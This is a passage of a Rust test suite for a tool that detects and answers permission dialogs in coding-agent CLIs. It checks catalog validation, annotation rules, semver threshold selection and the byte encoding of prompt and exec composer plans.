                    "negative column",
                    json!([{"row":30,"start_col":-1,"end_col":4,"bg":rgb.clone()}]),
                ),
                (
                    "run extra field",
                    json!([{"row":30,"start_col":0,"end_col":4,"bg":rgb.clone(),"fg":rgb.clone()}]),
                ),
                (
                    "run missing field",
                    json!([{"row":30,"start_col":0,"bg":rgb.clone()}]),
                ),
                ("not an array", json!({"row":30})),
            ] {
                assert!(
                    guarded_fixture(IDLE_FIXTURE, |s| s["cell_backgrounds"] = runs).is_err(),
                    "{case} must be rejected"
                );
            }
            assert!(
                guarded_fixture(PERMISSION_FIXTURE, |s| {
                    s["cell_backgrounds"]
                        .as_array_mut()
                        .unwrap()
                        .push(json!({"row":21,"start_col":5,"end_col":7,"bg":{"kind":"indexed","index":1}}));
                })
                .is_err(),
                "a run overlapping a captured run is rejected"
            );
        }

        #[test]
        fn bundled_opencode_episode_survives_the_dialog_and_closes_not_visible_on_the_idle_composer()
         {
            let at = |bytes: &[u8], output_seq: u64| {
                let mut replayed = observe(&replay(bytes));
                replayed.output_seq = output_seq;
                replayed.raw_evidence["screen_seq"] = json!(output_seq);
                replayed
            };
            let origin = Instant::now();
            let mut tracker = tracker();
            open(&mut tracker, &at(&fixture(PERMISSION_FIXTURE), 1), origin);
            let episode = tracker.active_episode();
            for (index, millis) in [200u64, 400, 3000].into_iter().enumerate() {
                let update = tracker
                    .observe(
                        &at(&fixture(DENY_3_FIXTURE), 2 + index as u64),
                        origin + Duration::from_millis(millis),
                        NOW,
                    )
                    .unwrap();
                assert!(
                    update.transitions.is_empty(),
                    "{millis} ms: {:?}",
                    update.transitions
                );
                assert_eq!(update.visibility, Visibility::Visible, "{millis} ms");
                assert_eq!(tracker.active_episode(), episode);
            }
            let first = tracker
                .observe(
                    &at(&fixture(IDLE_FIXTURE), 10),
                    origin + Duration::from_millis(3100),
                    NOW,
                )
                .unwrap();
            assert!(first.transitions.is_empty());
            let held = tracker
                .observe(
                    &at(&fixture(IDLE_FIXTURE), 11),
                    origin + Duration::from_millis(3350),
                    NOW,
                )
                .unwrap();
            let closes = held
                .transitions
                .iter()
                .filter(|t| t.kind == RuntimeEventKind::InteractionClosed)
                .collect::<Vec<_>>();
            assert_eq!(closes.len(), 1, "{:?}", held.transitions);
            assert_eq!(
                closes[0].close_reason,
                Some(InteractionCloseReason::NotVisible)
            );
        }
    }

    mod annotation {
        use crate::coding_agent::catalog::test_support::annotation::*;
        use crate::coding_agent::catalog::tests::*;
        fn rejected(label: &str, change: impl FnOnce(&mut Value)) {
            assert!(ProfileCatalog::from_definitions(&annotated()).is_ok());
            let mut value = annotated();
            change(&mut value);
            assert!(
                ProfileCatalog::from_definitions(&value).is_err(),
                "annotation catalog accepted: {label}"
            );
        }
        #[test]
        fn annotation_catalog_accepts_each_kind_in_the_annotations_group_and_a_null_group() {
            assert!(ProfileCatalog::from_definitions(&annotated()).is_ok());
            assert!(ProfileCatalog::from_definitions(&definitions()).is_ok());
            for (id, observation) in [
                (REFUSAL, "automatic_refusal"),
                (UNAVAILABLE, "automatic_review_unavailable"),
                (AVAILABLE, "automatic_review_available"),
            ] {
                let mut value = definitions();
                value["profiles"][0]["rules"]
                    .as_array_mut()
                    .unwrap()
                    .push(annotation_rule(id, observation));
                value["profiles"][0]["capabilities"]["annotations"] =
                    json!({"rule_ids":[id],"fixture_ids":[FIXTURE]});
                assert!(
                    ProfileCatalog::from_definitions(&value).is_ok(),
                    "{observation}"
                );
            }
            let mut without_reject = annotated();
            rule(&mut without_reject, REFUSAL)["frame"]["reject_patterns"] = json!([]);
            assert!(ProfileCatalog::from_definitions(&without_reject).is_ok());
        }

        #[test]
        fn annotation_catalog_requires_the_annotations_capability_key_with_valid_provenance() {
            rejected("missing annotations key", |value| {
                value["profiles"][0]["capabilities"]
                    .as_object_mut()
                    .unwrap()
                    .remove("annotations");
            });
            assert!(
                ProfileCatalog::from_definitions(&{
                    let mut value = definitions();
                    value["profiles"][0]["capabilities"]
                        .as_object_mut()
                        .unwrap()
                        .remove("annotations");
                    value
                })
                .is_err(),
                "a profile without annotation rules still declares the key"
            );
            rejected("unknown annotations field", |value| {
                value["profiles"][0]["capabilities"]["annotations"]["unexpected"] = json!(true);
            });
            rejected("empty annotation rule ids", |value| {
                value["profiles"][0]["capabilities"]["annotations"]["rule_ids"] = json!([]);
            });
            rejected("unknown annotation rule id", |value| {
                value["profiles"][0]["capabilities"]["annotations"]["rule_ids"] =
                    json!([REFUSAL, UNAVAILABLE, AVAILABLE, "missing-rule"]);
            });
            rejected("empty annotation provenance", |value| {
                value["profiles"][0]["capabilities"]["annotations"]["fixture_ids"] = json!([]);
            });
            rejected("unknown annotation fixture", |value| {
                value["profiles"][0]["capabilities"]["annotations"]["fixture_ids"] =
                    json!(["missing-fixture"]);
            });
            rejected("annotation fixture of another version", |value| {
                let mut other = value["fixtures"][0].clone();
                other["id"] = json!("other-version-fixture");
                other["native_version"] = json!("0.0.0");
                value["fixtures"].as_array_mut().unwrap().push(other);
                value["profiles"][0]["capabilities"]["annotations"]["fixture_ids"] =
                    json!(["other-version-fixture"]);
            });
            rejected("annotation fixture of another backend", |value| {
                let mut other = value["fixtures"][0].clone();
                other["id"] = json!("other-backend-fixture");
                other["backend"] = json!("claude");
                value["fixtures"].as_array_mut().unwrap().push(other);
                value["profiles"][0]["capabilities"]["annotations"]["fixture_ids"] =
                    json!(["other-backend-fixture"]);
            });
        }

        #[test]
        fn annotation_catalog_keeps_annotation_and_screen_state_groups_disjoint() {
            rejected("annotation rule in detection", |value| {
                value["profiles"][0]["capabilities"]["detection"]["rule_ids"] =
                    json!([RULE, REFUSAL]);
            });
            rejected("annotation rule in composer", |value| {
                value["profiles"][0]["capabilities"]["composer"] =
                    json!({"rule_ids":[AVAILABLE],"fixture_ids":[FIXTURE]});
            });
            rejected("permission rule in annotations", |value| {
                value["profiles"][0]["capabilities"]["annotations"]["rule_ids"] =
                    json!([REFUSAL, UNAVAILABLE, AVAILABLE, RULE]);
            });
            rejected("annotation rule outside the annotations group", |value| {
                value["profiles"][0]["capabilities"]["annotations"]["rule_ids"] =
                    json!([REFUSAL, UNAVAILABLE]);
            });
            rejected("annotation rules without an annotations group", |value| {
                value["profiles"][0]["capabilities"]["annotations"] = Value::Null;
            });
        }

        #[test]
        fn annotation_catalog_enforces_annotation_rule_fields_and_the_frame_guard() {
            rejected("annotation choices", |value| {
                rule(value, REFUSAL)["extract"]["choices"] = json!([
                    {"id":"refused","label":{"matcher_id":"operation","capture":"operation"},"scope":"single_request"}
                ]);
            });
            rejected("annotation native request id", |value| {
                rule(value, REFUSAL)["extract"]["native_request_id"] =
                    json!({"matcher_id":"operation","capture":"operation"});
            });
            rejected("annotation verified noninteraction", |value| {
                rule(value, AVAILABLE)["verified_noninteraction"] = json!(true);
            });
            rejected("refusal without an operation", |value| {
                rule(value, REFUSAL)["extract"]["operation"] = Value::Null;
            });
            for id in [UNAVAILABLE, AVAILABLE] {
                rejected(&format!("{id} with an operation"), |value| {
                    let rule = rule(value, id);
                    rule["matchers"].as_array_mut().unwrap().push(
                        json!({"id":"operation","scope":"line","pattern":"^(?P<operation>.+)$"}),
                    );
                    rule["extract"]["operation"] =
                        json!({"matcher_id":"operation","capture":"operation"});
                });
            }
            rejected("missing frame", |value| {
                rule(value, REFUSAL)
                    .as_object_mut()
                    .unwrap()
                    .remove("frame");
            });
            rejected("empty frame require patterns", |value| {
                rule(value, REFUSAL)["frame"]["require_patterns"] = json!([]);
            });
            rejected("uncompilable frame require pattern", |value| {
                rule(value, REFUSAL)["frame"]["require_patterns"] = json!(["^(unclosed$"]);
            });
            rejected("uncompilable frame reject pattern", |value| {
                rule(value, REFUSAL)["frame"]["reject_patterns"] = json!(["^[unclosed$"]);
            });
            rejected("missing frame reject patterns", |value| {
                rule(value, REFUSAL)["frame"]
                    .as_object_mut()
                    .unwrap()
                    .remove("reject_patterns");
            });
            rejected("unknown frame field", |value| {
                rule(value, REFUSAL)["frame"]["unexpected"] = json!(true);
            });
            rejected("frame on a non-annotation rule", |value| {
                rule(value, RULE)["frame"] =
                    json!({"require_patterns":["^Live footer$"],"reject_patterns":[]});
            });
        }
    }
    mod profile_thresholds {
        use crate::coding_agent::catalog::tests::*;
        use crate::coding_agent::detector::test_support::bundled_observe;

        fn catalog(profiles: &[(&str, &str)]) -> ProfileCatalog {
            ProfileCatalog::from_definitions(&thresholds(profiles)).unwrap()
        }

        /// The label of the declaration whose `min_version` the selection reports.
        fn selected<'a>(
            catalog: &ProfileCatalog,
            declarations: &[(&'a str, &str)],
            probe: &str,
        ) -> Option<&'a str> {
            let min_version = catalog
                .capabilities(CodingAgent::Codex, Some(probe))
                .min_version?;
            let (label, _) = declarations
                .iter()
                .find(|(_, declared)| *declared == min_version)
                .expect("selection reports a declared min_version");
            Some(label)
        }

        fn rejected(value: &Value, label: &str) {
            match ProfileCatalog::from_definitions(value) {
                Err(error) => {
                    assert_eq!(error.exit_code(), 2, "{label}: {}", error.message());
                    assert!(
                        error.message().starts_with("invalid native profile: "),
                        "{label}: {}",
                        error.message()
                    );
                }
                Ok(_) => panic!("{label} accepted"),
            }
        }

        const MALFORMED: [&str; 8] = [
            "2.1",
            "2.1.302.1",
            "v2.1.302",
            "01.2.3",
            "1.2.3-",
            "1.2.3-01",
            " 1.2.3",
            "synthetic-0.0.1",
        ];

        #[test]
        fn threshold_selection_picks_the_greatest_boundary_at_or_below_the_version_in_any_order() {
            for declarations in [
                [("first", "2.1.302"), ("second", "2.1.310")],
                [("second", "2.1.310"), ("first", "2.1.302")],
            ] {
                let catalog = catalog(&declarations);
                for (probe, expected) in [
                    ("2.1.302", Some("first")),
                    ("2.1.308", Some("first")),
                    ("2.1.310-beta.1", Some("first")),
                    ("2.1.310", Some("second")),
                    ("99.0.0", Some("second")),
                    ("2.1.301", None),
                ] {
                    assert_eq!(
                        selected(&catalog, &declarations, probe),
                        expected,
                        "{declarations:?} {probe}"
                    );
                    let detection = catalog
                        .capabilities(CodingAgent::Codex, Some(probe))
                        .detection;
                    assert_eq!(detection == Coverage::Tested, expected.is_some(), "{probe}");
                }
            }
            let first = [("first", "2.1.302")];
            let both = [("first", "2.1.302"), ("second", "2.1.310")];
            let before = catalog(&first);
            let after = catalog(&both);
            for probe in ["2.1.302", "2.1.308", "2.1.310-beta.1"] {
                assert_eq!(
                    selected(&after, &both, probe),
                    selected(&before, &first, probe),
                    "{probe}"
                );
            }
        }

        #[test]
        fn threshold_selection_compares_numeric_components_numerically() {
            let declarations = [("nine", "0.9.0"), ("ten", "0.10.0")];
            let catalog = catalog(&declarations);
            for (probe, expected) in [
                ("0.9.99", Some("nine")),
                ("0.10.0", Some("ten")),
                ("0.8.9", None),
            ] {
                assert_eq!(
                    selected(&catalog, &declarations, probe),
                    expected,
                    "{probe}"
                );
            }
        }

        #[test]
        fn threshold_selection_orders_prereleases_by_semver_precedence() {
            let declarations = [
                ("alpha-1", "1.0.0-alpha.1"),
                ("beta-2", "1.0.0-beta.2"),
                ("beta-11", "1.0.0-beta.11"),
                ("release", "1.0.0"),
            ];
            let catalog = catalog(&declarations);
            for (probe, expected) in [
                ("1.0.0-alpha", None),
                ("1.0.0-alpha.beta", Some("alpha-1")),
                ("1.0.0-beta.10", Some("beta-2")),
                ("1.0.0-beta.11", Some("beta-11")),
                ("1.0.0-rc.1", Some("beta-11")),
                ("1.0.0", Some("release")),
            ] {
                assert_eq!(
                    selected(&catalog, &declarations, probe),
                    expected,
                    "{probe}"
                );
            }
        }

        #[test]
        fn threshold_selection_gives_build_metadata_no_precedence() {
            let declarations = [("built", "1.2.0+build.1"), ("older", "1.0.0")];
            let catalog = catalog(&declarations);
            for (probe, expected) in [
                ("1.2.0", Some("built")),
                ("1.2.0+other.9", Some("built")),
                ("1.2.0-rc.1+build.1", Some("older")),
            ] {
                assert_eq!(
                    selected(&catalog, &declarations, probe),
                    expected,
                    "{probe}"
                );
            }
        }

        #[test]
        fn threshold_selection_stays_within_each_backend() {
            let mut value = thresholds(&[("codex-low", "0.5.0"), ("codex-high", "2.0.0")]);
            let claude = thresholds_for(CodingAgent::Claude, &[("claude-only", "2.0.0")]);
            for key in ["fixtures", "profiles"] {
                value[key]
                    .as_array_mut()
                    .unwrap()
                    .extend(claude[key].as_array().unwrap().iter().cloned());
            }
            let catalog = ProfileCatalog::from_definitions(&value).unwrap();
            for (backend, probe, expected) in [
                (CodingAgent::Codex, "1.0.0", Some("0.5.0")),
                (CodingAgent::Claude, "1.0.0", None),
                (CodingAgent::Claude, "2.0.0", Some("2.0.0")),
                (CodingAgent::Opencode, "2.0.0", None),
            ] {
                assert_eq!(
                    catalog
                        .capabilities(backend, Some(probe))
                        .min_version
                        .as_deref(),
                    expected,
                    "{backend:?} {probe}"
                );
            }
        }

        #[test]
        fn threshold_validation_rejects_malformed_profile_and_fixture_versions() {
            assert!(ProfileCatalog::from_definitions(&definitions()).is_ok());
            for malformed in MALFORMED {
                let mut value = definitions();
                value["profiles"][0]["min_version"] = json!(malformed);
                rejected(&value, &format!("min_version {malformed:?}"));
                let mut value = definitions();
                value["fixtures"][0]["native_version"] = json!(malformed);
                rejected(&value, &format!("fixture native_version {malformed:?}"));
            }
        }

        #[test]
        fn threshold_validation_rejects_equal_precedence_thresholds_for_one_backend() {
            for pair in [
                [("first", "1.0.0"), ("second", "1.0.0")],
                [("first", "1.0.0"), ("second", "1.0.0+build.2")],
            ] {
                rejected(&thresholds(&pair), &format!("{pair:?}"));
            }
        }

        #[test]
        fn fixture_interval_bounds_every_cited_capture_by_its_profile_thresholds() {
            fn citing(profile: usize, citation: &str, captured: &str) -> Value {
                let mut value = thresholds(&[("first", "1.0.0"), ("second", "2.0.0")]);
                value["fixtures"]
                    .as_array_mut()
                    .unwrap()
                    .push(fixture_at("interval-probe", captured));
                *value
                    .pointer_mut(&format!("/profiles/{profile}/capabilities/{citation}"))
                    .unwrap() = json!(["interval-probe"]);
                value
            }
            for citation in [
                "detection/fixture_ids",
                "composer/fixture_ids",
                "composer/submission/prompt/fixture_ids",
                "composer/submission/exec/fixture_ids",
                "annotations/fixture_ids",
                "answers/0/fixture_ids",
            ] {
                for (profile, captured) in [(0, "1.5.0"), (0, "2.0.0-rc.1"), (1, "9.0.0")] {
                    assert!(
                        ProfileCatalog::from_definitions(&citing(profile, citation, captured))
                            .is_ok(),
                        "{citation} profile {profile} {captured}"
                    );
                }
                for (profile, captured) in [(0, "1.0.0-rc.1"), (0, "2.0.0+build.1"), (1, "1.9.9")] {
                    rejected(
                        &citing(profile, citation, captured),
                        &format!("{citation} profile {profile} {captured}"),
                    );
                }
            }
        }

        #[test]
        fn capability_reuse_resolves_every_capability_through_the_selected_profile() {
            let catalog = catalog(&[("first", "1.0.0"), ("second", "2.0.0")]);
            let mut rows = vec![
                "Live footer".to_owned(),
                "Refused: write outside.txt".to_owned(),
                "Refusal end".to_owned(),
            ];
            rows.extend(lines("write disposable.txt"));
            let screen = terminal(&rows, 80, false).snapshot();
            for (run, name, min_version) in
                [("1.4.2", "first", "1.0.0"), ("3.1.4", "second", "2.0.0")]
            {
                let fixture = format!("{FIXTURE}-codex-{name}");
                let observed = Detector::new(&catalog, CodingAgent::Codex, Some(run))
                    .observe(&screen)
                    .unwrap();
                assert_eq!(
                    observed.kind,
                    ObservationKind::Interaction(InteractionClass::PermissionRequest)
                );
                assert_eq!(
                    catalog
                        .capabilities(CodingAgent::Codex, Some(run))
                        .min_version
                        .as_deref(),
                    Some(min_version),
                    "{run}"
                );
                assert_eq!(observed.raw_evidence["native_version"], run);
                assert_eq!(observed.annotations.len(), 1, "{run}");
                assert_eq!(observed.annotations[0].raw_evidence["native_version"], run);
                for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
                    let plan = catalog
                        .composer_plan(CodingAgent::Codex, run, operation)
                        .unwrap_or_else(|| panic!("{run} {operation:?} plan"));
                    assert_eq!(plan.native_version(), run);
                    assert_eq!(plan.fixture_ids(), std::slice::from_ref(&fixture));
                }
                let capability = catalog
                    .answer_plan(
                        CodingAgent::Codex,
                        run,
                        RULE,
                        &AnswerKey::Decision(PermissionDecision::Allow),
                    )
                    .unwrap_or_else(|| panic!("{run} answer plan"))
                    .capability()
                    .clone();
                assert_eq!(capability.native_version(), run);
                assert_eq!(capability.answer_rule_id(), format!("{name}-allow-plan"));
                assert_eq!(capability.fixture_ids(), &[fixture]);
            }
        }

        #[test]
        fn bundled_later_versions_reuse_the_complete_boundary_profile_including_claude_2_1_308() {
            let bundled = ProfileCatalog::bundled().unwrap();
            for (boundary, request) in BUNDLED_BOUNDARIES.iter().zip([
                "claude-bash-permission",
                "codex-exec-approval",
                "opencode-shell-permission",
            ]) {
                let backend = boundary.backend;
                let at = bundled.capabilities(backend, Some(boundary.min_version));
                assert_eq!(at.min_version.as_deref(), Some(boundary.min_version));
                for later in boundary.later {
                    let context = format!("{backend:?} {later}");
                    let reused = bundled.capabilities(backend, Some(later));
                    assert_eq!(reused.min_version, at.min_version, "{context}");
                    assert_eq!(reused.detection, at.detection, "{context}");
                    assert_eq!(reused.composer, at.composer, "{context}");
                    assert_eq!(reused.prompt_submission, at.prompt_submission, "{context}");
                    assert_eq!(
                        reused.native_exec_submission, at.native_exec_submission,
                        "{context}"
                    );
                    assert_eq!(reused.answer_decisions, at.answer_decisions, "{context}");
                    for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                        let exact = bundled
                            .answer_plan(
                                backend,
                                boundary.min_version,
                                request,
                                &AnswerKey::Decision(decision),
                            )
                            .expect("bundled boundary answer plan");
                        let plan = bundled
                            .answer_plan(backend, later, request, &AnswerKey::Decision(decision))
                            .unwrap_or_else(|| panic!("{context} {decision:?}"));
                        assert_eq!(plan.capability().native_version(), later);
                        assert_eq!(
                            plan.capability().answer_rule_id(),
                            exact.capability().answer_rule_id()
                        );
                        assert_eq!(
                            plan.stages()
                                .iter()
                                .map(|s| s.bytes().to_vec())
                                .collect::<Vec<_>>(),
                            exact
                                .stages()
                                .iter()
                                .map(|s| s.bytes().to_vec())
                                .collect::<Vec<_>>(),
                            "{context} {decision:?}"
                        );
                    }
                }
            }
            for id in [
                "claude-2.1.302-auto-ask-permission-1",
                "claude-2.1.302-auto-refusal-notice-idle-1",
            ] {
                let exact = bundled_observe(CodingAgent::Claude, "2.1.302", id);
                let reused = bundled_observe(CodingAgent::Claude, "2.1.308", id);
                assert_eq!(reused.kind, exact.kind, "{id}");
                assert_eq!(reused.rule_id, exact.rule_id, "{id}");
                assert_eq!(reused.raw_evidence["native_version"], "2.1.308", "{id}");
                let rules = |observed: &ScreenObservation| {
                    observed
                        .annotations
                        .iter()
                        .map(|block| block.rule_id.clone())
                        .collect::<Vec<_>>()
                };
                assert_eq!(rules(&reused), rules(&exact), "{id}");
            }
        }
    }

    use crate::broker::runtime::PermissionDecision;

    #[test]
    fn composer_observation_only_definition_preserves_observation_without_executable_plans() {
        let value = simple_definition("composer_empty", true);
        let catalog = ProfileCatalog::from_definitions(&value).unwrap();
        capabilities(
            &catalog,
            CodingAgent::Codex,
            Some(VERSION),
            Coverage::Tested,
            (Coverage::Unknown, Coverage::Unknown),
        );
        for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
            assert!(
                catalog
                    .composer_plan(CodingAgent::Codex, VERSION, operation)
                    .is_none()
            );
        }
        assert_eq!(
            catalog
                .capabilities(CodingAgent::Codex, Some(VERSION))
                .detection,
            Coverage::Unknown
        );
        assert!(
            catalog
                .capabilities(CodingAgent::Codex, Some(VERSION))
                .answer_decisions
                .is_empty()
        );
    }

    #[test]
    fn composer_nullable_operations_and_absent_composer_keep_executable_coverage_unknown() {
        for value in [definition(None, None), definitions()] {
            let catalog = ProfileCatalog::from_definitions(&value).unwrap();
            let observation = if value["profiles"][0]["capabilities"]["composer"].is_null() {
                Coverage::Unknown
            } else {
                Coverage::Tested
            };
            capabilities(
                &catalog,
                CodingAgent::Codex,
                Some(VERSION),
                observation,
                (Coverage::Unknown, Coverage::Unknown),
            );
            for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
                assert!(
                    catalog
                        .composer_plan(CodingAgent::Codex, VERSION, operation)
                        .is_none()
                );
            }
        }
    }

    #[test]
    fn composer_prompt_plan_retains_exact_selected_metadata_and_independent_coverage() {
        let catalog = ProfileCatalog::from_definitions(&definition(Some("7e"), None)).unwrap();
        metadata(
            &plan(&catalog, ComposerOperation::Prompt),
            &[PROMPT_FIXTURE.to_owned()],
        );
        capabilities(
            &catalog,
            CodingAgent::Codex,
            Some(VERSION),
            Coverage::Tested,
            (Coverage::Tested, Coverage::Unknown),
        );
        assert!(
            catalog
                .composer_plan(CodingAgent::Codex, VERSION, ComposerOperation::Exec)
                .is_none()
        );
        let actual = catalog.capabilities(CodingAgent::Codex, Some(VERSION));
        assert_eq!(actual.detection, Coverage::Unknown);
        assert!(actual.answer_decisions.is_empty());
    }

    #[test]
    fn composer_exec_plan_retains_exact_selected_metadata_and_independent_coverage() {
        let catalog = ProfileCatalog::from_definitions(&definition(None, Some("6b6c"))).unwrap();
        metadata(
            &plan(&catalog, ComposerOperation::Exec),
            &[EXEC_FIXTURE.to_owned()],
        );
        capabilities(
            &catalog,
            CodingAgent::Codex,
            Some(VERSION),
            Coverage::Tested,
            (Coverage::Unknown, Coverage::Tested),
        );
        assert!(
            catalog
                .composer_plan(CodingAgent::Codex, VERSION, ComposerOperation::Prompt)
                .is_none()
        );
        let actual = catalog.capabilities(CodingAgent::Codex, Some(VERSION));
        assert_eq!(actual.detection, Coverage::Unknown);
        assert!(actual.answer_decisions.is_empty());
    }

    #[test]
    fn composer_operation_provenance_and_exact_selection_do_not_authorize_other_profiles() {
        let mut value = definition(Some("7e"), Some("6b6c"));
        value["profiles"][0]["rules"]
            .as_array_mut()
            .unwrap()
            .push(definitions()["profiles"][0]["rules"][0].clone());
        value["profiles"][0]["capabilities"]["detection"] =
            json!({"rule_ids":[RULE],"fixture_ids":[FIXTURE]});
        let answers = [("allow", "allow-once", "allow"), ("deny", "deny-once", "deny")].map(|(decision, choice, focus)| {
                json!({"decision":decision,"request_rule_id":RULE,"answer_rule_id":format!("synthetic-{decision}-plan"),
                    "choice_id":choice,"focus_matcher_id":focus,"fixture_ids":[FIXTURE],
                    "stages":[{"bytes_hex":"78","required_rule_id":RULE,"required_choice_id":choice}]})
            });
        value["profiles"][0]["capabilities"]["answers"] = json!(answers);
        let catalog = ProfileCatalog::from_definitions(&value).unwrap();
        let prompt = plan(&catalog, ComposerOperation::Prompt);
        let exec = plan(&catalog, ComposerOperation::Exec);
        metadata(&prompt, &[PROMPT_FIXTURE.to_owned()]);
        metadata(&exec, &[EXEC_FIXTURE.to_owned()]);
        assert_eq!(prompt.encode("literal").unwrap(), b"literal~");
        assert_eq!(exec.encode("literal").unwrap(), b"! literalkl");
        capabilities(
            &catalog,
            CodingAgent::Codex,
            Some(VERSION),
            Coverage::Tested,
            (Coverage::Tested, Coverage::Tested),
        );
        let actual = catalog.capabilities(CodingAgent::Codex, Some(VERSION));
        assert_eq!(actual.detection, Coverage::Tested);
        assert_eq!(
            actual.answer_decisions,
            [PermissionDecision::Allow, PermissionDecision::Deny]
        );
        capabilities(
            &catalog,
            CodingAgent::Codex,
            None,
            Coverage::Unknown,
            (Coverage::Unknown, Coverage::Unknown),
        );
        let bundled = ProfileCatalog::bundled().unwrap();
        for &backend in CodingAgent::all() {
            let actual = bundled.capabilities(backend, Some(VERSION));
            assert_eq!(
                (actual.prompt_submission, actual.native_exec_submission),
                (Coverage::Unknown, Coverage::Unknown),
                "{backend:?}"
            );
            for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
                assert!(bundled.composer_plan(backend, VERSION, operation).is_none());
                if backend != CodingAgent::Codex {
                    assert!(catalog.composer_plan(backend, VERSION, operation).is_none());
                    capabilities(
                        &catalog,
                        backend,
                        Some(VERSION),
                        Coverage::Unknown,
                        (Coverage::Unknown, Coverage::Unknown),
                    );
                }
            }
        }
    }

    #[test]
    fn composer_prompt_preserves_literal_utf8_between_empty_prefix_and_tested_submit_bytes() {
        let catalog = ProfileCatalog::from_definitions(&definition(Some("7e"), None)).unwrap();
        let literal = "  literal 世界 '$x' `backticks` \\\"quotes\\\"  ";
        let bytes = plan(&catalog, ComposerOperation::Prompt)
            .encode(literal)
            .unwrap();
        assert_eq!(bytes, expected(ComposerOperation::Prompt, literal, b"~"));
        assert_eq!(&bytes[..literal.len()], literal.as_bytes());
    }

    #[test]
    fn composer_exec_owns_exact_bang_space_prefix_without_changing_the_caller_literal() {
        let catalog = ProfileCatalog::from_definitions(&definition(None, Some("6b6c"))).unwrap();
        let literal = "printf '%s' 世界 '$x' `literal`";
        let bytes = plan(&catalog, ComposerOperation::Exec)
            .encode(literal)
            .unwrap();
        assert_eq!(bytes, expected(ComposerOperation::Exec, literal, b"kl"));
        assert_eq!(&bytes[..2], b"! ");
        assert_eq!(&bytes[2..2 + literal.len()], literal.as_bytes());
    }
    #[test]
    fn composer_native_payload_limit_counts_prefix_utf8_literal_and_submit_bytes() {
        for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
            for submit_length in [1, 32] {
                let hex = "6b".repeat(submit_length);
                let value = match operation {
                    ComposerOperation::Prompt => definition(Some(&hex), None),
                    ComposerOperation::Exec => definition(None, Some(&hex)),
                };
                let catalog = ProfileCatalog::from_definitions(&value).unwrap();
                let selected = plan(&catalog, operation);
                let literal_size = 65536 - operation_prefix(operation).len() - submit_length;
                let literal = format!(
                    "{}{}",
                    "界".repeat(literal_size / 3),
                    "x".repeat(literal_size % 3)
                );
                assert_eq!(literal.len(), literal_size);
                let actual = selected.encode(&literal).unwrap();
                assert_eq!(actual.len(), 65536);
                assert_eq!(
                    actual,
                    expected(operation, &literal, &vec![b'k'; submit_length])
                );
                let oversized = format!("{literal}x");
                assert!(
                    selected.encode(&oversized).is_err(),
                    "65537 native payload bytes reject"
                );
            }
        }
    }

    #[test]
    fn composer_plans_withhold_debug_serialization_and_private_bytes_from_errors() {
        assert_no_debug_or_serialize!(ComposerPlan);
        const SUBMIT: &str = "E16_PRIVATE_SUBMIT";
        const LITERAL: &str = "E16_PRIVATE_LITERAL";
        let hex = crate::digest::hex(SUBMIT.as_bytes());
        for operation in [ComposerOperation::Prompt, ComposerOperation::Exec] {
            let good = match operation {
                ComposerOperation::Prompt => definition(Some(&hex), None),
                ComposerOperation::Exec => definition(None, Some(&hex)),
            };
            let catalog = ProfileCatalog::from_definitions(&good).unwrap();
            let selected = plan(&catalog, operation);
            assert_eq!(
                selected.encode("positive").unwrap(),
                expected(operation, "positive", SUBMIT.as_bytes())
            );
            let mut bad = good.clone();
            bad["profiles"][0]["capabilities"]["composer"]["submission"]
                [operation_name(operation)]["prefix_hex"] = match operation {
                ComposerOperation::Prompt => json!("00"),
                ComposerOperation::Exec => json!(""),
            };
            let definition_error =
                reject(&good, &bad, operation, "private submit with invalid prefix");
            let literal = format!("{LITERAL}{}", "x".repeat(65537));
            let encode_error = match selected.encode(&literal) {
                Err(error) => error,
                Ok(_) => panic!("oversized private literal rejects"),
            };
            for error in [definition_error, encode_error] {
                let diagnostic = format!("{error:?}\n{error}\n{}", error.message());
                for private in [SUBMIT, LITERAL, &hex] {
                    assert!(
                        !diagnostic.contains(private),
                        "plan errors withhold selected bytes and literal payload"
                    );
                }
            }
        }
    }
}
